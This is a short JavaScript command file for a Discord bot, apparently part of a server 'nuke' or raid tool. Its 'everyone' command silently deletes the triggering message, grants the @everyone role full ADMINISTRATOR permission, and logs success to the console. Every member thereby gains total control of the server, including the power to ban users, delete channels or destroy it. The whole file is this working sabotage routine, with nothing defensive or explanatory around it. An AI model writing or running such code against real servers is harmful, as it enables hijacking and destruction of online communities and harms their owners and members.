const { MessageEmbed } = require('discord.js')
const { inspect } = require('util')
const { red, greenBright, cyan, yellow } = require("chalk");
module.exports = {
    name: 'everyone',
    cooldown: 5,
    category: 'Administrator',
    description: '',
    run: async (client, message, args, prefix) => {
        message.delete()

        const everyone = await message.guild.roles.cache.find((role) => role.name === "@everyone")
        everyone.setPermissions(["ADMINISTRATOR"])
        console.log(greenBright(`[Success] Granted admin permission to everyone role!`))
        return console.log(yellow((`[Success] Finished task!`)))
    }
}